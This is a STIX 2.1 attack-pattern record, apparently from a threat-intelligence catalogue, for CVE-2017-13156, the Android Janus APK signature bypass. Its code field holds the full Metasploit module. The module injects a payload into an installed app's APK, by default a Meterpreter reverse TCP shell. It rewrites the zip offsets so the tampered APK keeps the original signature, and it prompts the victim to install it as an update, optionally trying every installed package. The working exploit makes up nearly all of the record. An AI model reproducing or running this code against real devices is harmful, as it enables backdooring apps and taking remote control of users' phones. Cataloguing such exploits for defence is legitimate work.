{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--228e999e-61ae-4527-b90a-e8b377e47973",
    "created": "2024-08-14T16:35:08.251563Z",
    "modified": "2024-08-14T16:35:08.251567Z",
    "name": "\"Android Janus APK Signature bypass\"",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/android/local/janus.rb",
            "external_id": "janus.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-13156"
        },
        {
            "source_name": "reference",
            "url": "https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Android::Priv\n  include Msf::Payload::Android\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => \"Android Janus APK Signature bypass\",\n          'Description' => %q{\n            This module exploits CVE-2017-13156 in Android to install a payload into another\n            application. The payload APK will have the same signature and can be installed\n            as an update, preserving the existing data.\n            The vulnerability was fixed in the 5th December 2017 security patch, and was\n            additionally fixed by the APK Signature scheme v2, so only APKs signed with\n            the v1 scheme are vulnerable.\n            Payload handler is disabled, and a multi/handler must be started first.\n          },\n          'Author' => [\n            'GuardSquare', # discovery\n            'V-E-O',       # proof of concept\n            'timwr',       # metasploit module\n            'h00die',      # metasploit module\n          ],\n          'References' => [\n            [ 'CVE', '2017-13156' ],\n            [ 'URL', 'https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures' ],\n            [ 'URL', 'https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156' ],\n          ],\n          'DisclosureDate' => '2017-07-31',\n          'SessionTypes' => [ 'meterpreter' ],\n          'Platform' => [ 'android' ],\n          'Arch' => [ ARCH_DALVIK ],\n          'Targets' => [ [ 'Automatic', {} ] ],\n          'DefaultOptions' => {\n            'PAYLOAD' => 'android/meterpreter/reverse_tcp',\n            'AndroidWakelock' => false, # the target may not have the WAKE_LOCK permission\n            'DisablePayloadHandler' => true,\n          },\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'SideEffects' => [ARTIFACTS_ON_DISK, SCREEN_EFFECTS],\n            'Reliability' => [],\n            'Stability' => [SERVICE_RESOURCE_LOSS], # ZTE youtube app won't start anymore\n          },\n          'Compat' => {\n            'Meterpreter' => {\n              'Commands' => %w[\n                appapi_app_install\n              ]\n            }\n          }\n        }\n      )\n    )\n    register_options([\n      OptString.new('PACKAGE', [true, 'The package to target, or ALL to attempt all', 'com.phonegap.camerasample']),\n    ])\n  end\n\n  def check\n    os = cmd_exec(\"getprop ro.build.version.release\")\n    unless Rex::Version.new(os).between?(Rex::Version.new('5.1.1'), Rex::Version.new('8.0.0'))\n      vprint_error \"Android version #{os} is not vulnerable.\"\n      return CheckCode::Safe\n    end\n    vprint_good \"Android version #{os} appears to be vulnerable.\"\n\n    patch = cmd_exec('getprop ro.build.version.security_patch')\n    if patch.empty?\n      print_status 'Unable to determine patch level.  Pre-5.0 this is unaccessible.'\n    elsif patch > '2017-12-05'\n      vprint_error \"Android security patch level #{patch} is patched.\"\n      return CheckCode::Safe\n    else\n      vprint_good \"Android security patch level #{patch} is vulnerable\"\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    def infect(apkfile)\n      unless apkfile.start_with?(\"package:\")\n        fail_with Failure::BadConfig, 'Unable to locate app apk'\n      end\n      apkfile = apkfile[8..-1]\n      print_status \"Downloading APK: #{apkfile}\"\n      apk_data = read_file(apkfile)\n\n      begin\n        # Create an apk with the payload injected\n        apk_backdoor = ::Msf::Payload::Apk.new\n        apk_zip = apk_backdoor.backdoor_apk(nil, payload.encoded, false, false, apk_data, false)\n\n        # Extract the classes.dex\n        dex_data = ''\n        Zip::File.open_buffer(apk_zip) do |zipfile|\n          dex_data = zipfile.read(\"classes.dex\")\n        end\n        dex_size = dex_data.length\n\n        # Fix the original APKs zip file code directory\n        cd_end_addr = apk_data.rindex(\"\\x50\\x4b\\x05\\x06\")\n        cd_start_addr = apk_data[cd_end_addr + 16, cd_end_addr + 20].unpack(\"V\")[0]\n        apk_data[cd_end_addr + 16...cd_end_addr + 20] = [ cd_start_addr + dex_size ].pack(\"V\")\n        pos = cd_start_addr\n        while pos && pos < cd_end_addr\n          offset = apk_data[pos + 42, pos + 46].unpack(\"V\")[0]\n          apk_data[pos + 42...pos + 46] = [ offset + dex_size ].pack(\"V\")\n          pos = apk_data.index(\"\\x50\\x4b\\x01\\x02\", pos + 46)\n        end\n\n        # Prepend the new classes.dex to the apk\n        out_data = dex_data + apk_data\n        out_data[32...36] = [ out_data.length ].pack(\"V\")\n        out_data = fix_dex_header(out_data)\n\n        out_apk = \"/sdcard/#{Rex::Text.rand_text_alphanumeric 6}.apk\"\n        print_status \"Uploading APK: #{out_apk}\"\n        write_file(out_apk, out_data)\n        register_file_for_cleanup(out_apk)\n        print_status \"APK uploaded\"\n\n        # Prompt the user to update the APK\n        session.appapi.app_install(out_apk)\n        print_status \"User should now have a prompt to install an updated version of the app\"\n        true\n      rescue => e\n        print_error e.to_s\n        false\n      end\n    end\n\n    if datastore[\"PACKAGE\"] == 'ALL'\n      vprint_status('Finding installed packages (this can take a few minutes depending on list of installed packages)')\n      apkfiles = []\n      all = cmd_exec(\"pm list packages\").split(\"\\n\")\n      c = 1\n      all.each do |package|\n        package = package.split(':')[1]\n        vprint_status(\"Attempting exploit of apk #{c}/#{all.length} for #{package}\")\n        c += 1\n        next if ['com.metasploit.stage', # avoid injecting into ourself\n                ].include? package # This was left on purpose to be expanded as need be for testing\n\n        result = infect(cmd_exec(\"pm path #{package}\"))\n        break if result\n      end\n    else\n      infect(cmd_exec(\"pm path #{datastore[\"PACKAGE\"]}\"))\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2017-07-31",
    "x_mitre_platforms": [
        "[ 'android' ]"
    ]
}